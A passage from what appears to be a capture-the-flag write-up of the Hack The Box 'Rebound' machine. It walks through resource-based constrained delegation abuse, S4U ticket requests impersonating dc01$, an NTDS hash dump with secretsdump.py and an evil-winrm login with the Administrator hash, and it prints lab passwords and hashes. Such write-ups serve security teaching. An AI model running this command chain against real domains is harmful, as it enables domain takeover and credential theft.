<p>Initially, when running <code>rbcd.py</code>, it encountered an error:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">rbcd</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">delegate</span><span class="o">-</span><span class="n">to</span> <span class="s1">'delegator$'</span> <span class="o">-</span><span class="n">delegate</span><span class="o">-</span><span class="kn">from</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">ldaps</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">delegator$</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="n">e1630b0e18242439a50e9d8b5f5b7524</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">automatic</span> <span class="n">bind</span> <span class="ow">not</span> <span class="n">successful</span> <span class="o">-</span> <span class="n">invalidCredentials</span>
</pre></div>
<p>I don't know why it occurred, as we have valid credentials. Therefore, I decided to utilize Kerberos Authentication.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">getTGT</span><span class="o">.</span><span class="n">py</span> <span class="s1">'rebound.htb/delegator$@10.10.11.231'</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="n">e1630b0e18242439a50e9d8b5f5b7524</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">delegator</span><span class="err">$</span><span class="o">@</span><span class="mf">10.10.11.231</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>I'll export this <code>ccache</code> file to the <code>KRB5CCNAME</code> environment variable.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="s1">'delegator$@10.10.11.231.ccache'</span>
</pre></div>
<p>Then it threw this error:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">rbcd</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">delegate</span><span class="o">-</span><span class="n">to</span> <span class="s1">'delegator$'</span> <span class="o">-</span><span class="n">delegate</span><span class="o">-</span><span class="kn">from</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.231</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">delegator$</span> <span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">ldaps</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">invalid</span> <span class="n">server</span> <span class="n">address</span>
</pre></div>
<p>I repeated this process using older versions of Impacket, and it continued to throw the same error. Deciding to debug the <code>rbcd.py</code> program, I noticed that the issue originated from the <code>init_ldap_connection</code> function. Therefore, I created a virtual Python environment and made slight modifications to the function:</p><br/>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">init_ldap_connection</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">tls_version</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lmhash</span><span class="p">,</span> <span class="n">nthash</span><span class="p">):</span>
    <span class="n">user</span> <span class="o">=</span> <span class="s1">'</span><span class="si">%s</span><span class="se">\\</span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
    <span class="n">connect</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">dc_ip</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
    <span class="n">ldap_server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">connect</span><span class="p">,</span> <span class="n">get_info</span><span class="o">=</span><span class="n">ldap3</span><span class="o">.</span><span class="n">ALL</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">use_ssl</span><span class="o">=</span><span class="n">use_ssl</span><span class="p">,</span> <span class="n">tls</span><span class="o">=</span><span class="n">tls</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
</pre></div>
<p>Now, the server address will be the value we supply to the <code>-dc-ip</code> parameter.</p><br/>
<p>Finally, it worked, and we successfully modified the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of <code>delegator</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">rbcd</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">delegate</span><span class="o">-</span><span class="n">to</span> <span class="s1">'delegator$'</span> <span class="o">-</span><span class="n">delegate</span><span class="o">-</span><span class="kn">from</span> <span class="s1">'ldap_monitor'</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.231</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">delegator$</span> <span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">ldaps</span> <span class="o">-</span><span class="n">debug</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Impacket</span> <span class="n">Library</span> <span class="n">Installation</span> <span class="n">Path</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Rebound</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">krb</span><span class="o">/</span><span class="n">venv</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.10</span><span class="o">/</span><span class="n">site</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">impacket</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Using</span> <span class="n">Kerberos</span> <span class="n">Cache</span><span class="p">:</span> <span class="n">delegator</span><span class="err">$</span><span class="o">@</span><span class="mf">10.10.11.231</span><span class="o">.</span><span class="n">ccache</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">SPN</span> <span class="n">LDAP</span><span class="o">/</span><span class="n">DC01</span><span class="nd">@REBOUND</span><span class="o">.</span><span class="n">HTB</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">cache</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">AnySPN</span> <span class="ow">is</span> <span class="kc">True</span><span class="p">,</span> <span class="n">looking</span> <span class="k">for</span> <span class="n">another</span> <span class="n">suitable</span> <span class="n">SPN</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Returning</span> <span class="n">cached</span> <span class="n">credential</span> <span class="k">for</span> <span class="n">KRBTGT</span><span class="o">/</span><span class="n">REBOUND</span><span class="o">.</span><span class="n">HTB</span><span class="nd">@REBOUND</span><span class="o">.</span><span class="n">HTB</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Using</span> <span class="n">TGT</span> <span class="kn">from</span> <span class="nn">cache</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">KDC</span> <span class="n">at</span> <span class="mf">10.10.11.231</span><span class="p">:</span><span class="mi">88</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Initializing</span> <span class="n">domainDumper</span><span class="p">()</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Attribute</span> <span class="n">msDS</span><span class="o">-</span><span class="n">AllowedToActOnBehalfOfOtherIdentity</span> <span class="ow">is</span> <span class="n">empty</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Delegation</span> <span class="n">rights</span> <span class="n">modified</span> <span class="n">successfully</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">oorend</span> <span class="n">can</span> <span class="n">now</span> <span class="n">impersonate</span> <span class="n">users</span> <span class="n">on</span> <span class="n">delegator</span><span class="err">$</span> <span class="n">via</span> <span class="n">S4U2Proxy</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Accounts</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">act</span> <span class="n">on</span> <span class="n">behalf</span> <span class="n">of</span> <span class="n">other</span> <span class="n">identity</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="n">ldap_monitor</span>   <span class="p">(</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4078382237</span><span class="o">-</span><span class="mi">1492182817</span><span class="o">-</span><span class="mi">2568127209</span><span class="o">-</span><span class="mi">7681</span><span class="p">)</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Now, as <code>ldap_monitor</code>, we can act on behalf of any user over <code>delegator$</code>. Before requesting an ST on behalf of another user, we need to request a new <code>TGT</code> for <code>oorend</code>, due to the privilege modifications we made. Therefore, I'll use <code>getTGT.py</code> to request a new TGT.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">getTGT</span><span class="o">.</span><span class="n">py</span> <span class="s1">'rebound.htb/ldap_monitor'</span><span class="p">:</span><span class="s1">'1GR8t@$$4u'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">ldap_monitor</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Don't forget to export the <code>KRB5CCNAME</code> variable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">oorend</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Now, I'll request a Service Ticket (ST) on behalf of <code>dc01$</code>, specifying the SPN of <code>delegator$</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">getST</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">spn</span> <span class="s1">'browser/dc01.rebound.htb'</span> <span class="o">-</span><span class="n">impersonate</span> <span class="s2">"dc01$"</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.231</span> <span class="s1">'rebound.htb/ldap_monitor'</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Impersonating</span> <span class="n">dc01</span><span class="err">$</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Requesting</span> <span class="n">S4U2self</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Requesting</span> <span class="n">S4U2Proxy</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">dc01</span><span class="err">$</span><span class="o">.</span><span class="n">ccache</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Once we obtain the ST, we have to export it to the <code>KRB5CCNAME</code> variable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">dc01</span>\<span class="err">$</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Up to now, we have configured RBCD to act on behalf of the user <code>ldap_monitor</code> for <code>delegator$</code>. With this privilege, we can impersonate any user on <code>delegator$</code>, allowing us to perform privileged tasks with it. Subsequently, we have requested an ST on behalf of <code>dc01$</code> for <code>delegator$</code>. Leveraging our ST and the fact that <code>delegator$</code> has constrained delegation privileges, we can request a new ST impersonating the <code>dc01$</code> user, but this time for the <code>http/dc01.rebound.htb</code> service (which is the DC).</p><br/>
<p>One thing to highlight is that we're using the <code>dc01$</code> account instead of <code>administrator</code> because the latter cannot be delegated. You can verify this within the system or by using <code>BloodyAD</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'tbrady'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'543BOMBOMBUNmanda'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.11.231</span> <span class="n">get</span> <span class="nb">object</span> <span class="s1">'administrator'</span> <span class="o">--</span><span class="n">attr</span> <span class="s1">'useraccountcontrol'</span>

<span class="n">distinguishedName</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Administrator</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">userAccountControl</span><span class="p">:</span> <span class="n">NORMAL_ACCOUNT</span><span class="p">;</span> <span class="n">DONT_EXPIRE_PASSWORD</span><span class="p">;</span> <span class="n">NOT_DELEGATED</span>
</pre></div>
<p>As you can see, it has the <code>NOT_DELEGATED</code> attribute, which essentially means it cannot be delegated.</p><br/>
<p>To proceed, we need to specify the credentials of <code>delegator</code> and our Service Ticket. We can accomplish this by using the <code>-additional-ticket</code> parameter and then providing the credentials of <code>delegator$</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">getST</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">spn</span> <span class="s1">'http/dc01.rebound.htb'</span> <span class="o">-</span><span class="n">impersonate</span> <span class="s2">"dc01$"</span> <span class="o">-</span><span class="n">additional</span><span class="o">-</span><span class="n">ticket</span> <span class="s2">"dc01$.ccache"</span> <span class="s2">"rebound.htb/delegator$"</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="n">e1630b0e18242439a50e9d8b5f5b7524</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">user</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Impersonating</span> <span class="n">dc01</span><span class="err">$</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Using</span> <span class="n">additional</span> <span class="n">ticket</span> <span class="n">dc01</span><span class="err">$</span><span class="o">.</span><span class="n">ccache</span> <span class="n">instead</span> <span class="n">of</span> <span class="n">S4U2Self</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">Requesting</span> <span class="n">S4U2Proxy</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">dc01</span><span class="err">$</span><span class="o">.</span><span class="n">ccache</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Now, let's export our new ST to the <code>KRB5CCNAME</code> variable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">dc01</span>\<span class="err">$</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Finally, using our new <code>ST</code> impersonating <code>dc01$</code>, we can perform privileged actions. Let's dump the NTDS using <code>secretsdump.py</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">k</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Policy</span> <span class="n">SPN</span> <span class="n">target</span> <span class="n">name</span> <span class="n">validation</span> <span class="n">might</span> <span class="n">be</span> <span class="n">restricting</span> <span class="n">full</span> <span class="n">DRSUAPI</span> <span class="n">dump</span><span class="o">.</span> <span class="n">Try</span> <span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">user</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">176</span><span class="n">be138594933bb67db3b2572fc91b8</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">1108</span><span class="n">b27a9ff61ed4139d1443fbcf664b</span><span class="p">:::</span>
<span class="n">ppaul</span><span class="p">:</span><span class="mi">1951</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">7785</span><span class="n">a4172e31e908159b0904e1153ec0</span><span class="p">:::</span>
<span class="n">llune</span><span class="p">:</span><span class="mi">2952</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e283977e2cbffafc0d6a6bd2a50ea680</span><span class="p">:::</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>I'll retain the <code>administrator</code> NTLM hash and gain access to the system via <code>WinRM</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'176be138594933bb67db3b2572fc91b8'</span>

<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.5</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>
<p>Of course, it worked, and finally, we can read <code>root.txt</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="o">..</span>\<span class="n">desktop</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">76334</span><span class="o">*****************</span><span class="mi">55</span><span class="n">b6b0923b</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">desktop</span><span class="o">&gt;</span>
</pre></div>
            </div>
        </div>
    </section>

    <script src="/js/sidebarToggle.js"></script>
    <script src="/js/fixMobileImages.js"></script>
    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
